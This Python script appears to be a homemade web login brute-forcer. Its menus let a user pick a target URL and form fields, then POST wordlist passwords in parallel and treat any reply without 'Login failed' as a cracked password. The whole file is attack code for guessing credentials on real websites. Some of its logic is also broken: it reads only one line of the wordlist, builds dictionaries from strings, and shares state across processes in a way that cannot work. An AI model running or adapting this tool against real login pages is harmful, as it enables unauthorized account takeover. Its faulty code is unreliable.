import requests
import InputNFileIO
from multiprocessing import Pool


class CrackerSession:
    def __init__(self):
        self.url = ""
        self.cracked_passwords = []
        self.form_data = {}
        self.num_threads = 1
        self.target_selected = False
        self.menu = """
1. Configure target
2. Crack
3. Cracked passwords
4. Back
"""


def assign_host():
    while True:
        # The strip is added just in case extra white space is added
        address = input("Enter target URL: ").strip()
        try:
            # See if the address can be accessed
            r = requests.get(address)
        except requests.exceptions.MissingSchema:
            print("Invalid URL!")
        else:
            r.close()
            print("Target set to: " + address)
            break
    session.target_selected = True
    return address


def form():
    values = input("Enter form variable names(ex: user pass): ").split()
    form_values = {value: "" for value in values}
    while True:
        InputNFileIO.clear()
        response = input("Do you need to assign any static values? (y/n): ").lower()
        if response == "y":
            while True:
                InputNFileIO.clear()
                for i, key in enumerate(form_values.items()):
                    print(f"{i+1}. {key[0]} = {key[1]}")
                choice = InputNFileIO.int_input_getter("Which one?: ", range(1, len(values)+1))
                new_val = input("What value would you like to assign to this variable?: ")
                form_values[values[choice-1]] = new_val
                while True:
                    response2 = input("Anymore? (y/n): ").lower()
                    if response2 == "y":
                        break
                    elif response2 == "n":
                        return form_values
                    else:
                        print("That is not a valid option!")
        elif response == "n":
            return form_values
        else:
            print("That is not a valid option!")
            input("Press enter to continue...")


def set_threads():
    return InputNFileIO.int_input_getter("How many threads(1-16): ", range(1, 17))


def crack():
    path = input("Path to password file: ").strip()
    with open(path) as password_file:
        passwords = password_file.readline()
        print(passwords)
    with Pool(session.num_threads) as pool:
        results = pool.map(attack, passwords)
        success = list(filter(None, results))
    print(success)


def attack(password):
    temp_data = dict(str(session.form_data).replace("<val>", f"{password}"))
    print(temp_data)
    response = requests.post(url=session.url, data=temp_data)
    if bytes("Login failed", encoding="utf-8") not in response.content:
        session.cracked_passwords.append(dict(str(session.form_data).replace("<val>", password)))


def show_cracked():
    print(session.cracked_passwords)


def setup():
    while True:
        InputNFileIO.clear()
        print("Current Target:", session.url, end="")
        user_choice = InputNFileIO.int_input_getter(session.menu, range(1, 5))
        InputNFileIO.clear()
        # If they choose to "Set target host"
        if user_choice == 1:
            session.url = assign_host()
            session.form_data = form()
            session.num_threads = set_threads()
        elif user_choice == 2:
            options = []
            while True:
                for i, key in enumerate(session.form_data.items()):
                    print(f"{i + 1}. {key[0]} = {key[1]}")
                    options.append(key[0])
                var = InputNFileIO.int_input_getter("Which variable are you cracking?: ", range(1, len(session.form_data)+1))
                session.form_data[options[var-1]] = "<val>"
                break
            crack()
        elif user_choice == 3:
            show_cracked()
        else:
            # If the user chose 4 (the only other possible input) then quit to main menu
            break
        input("Press enter to continue...")


session = CrackerSession()
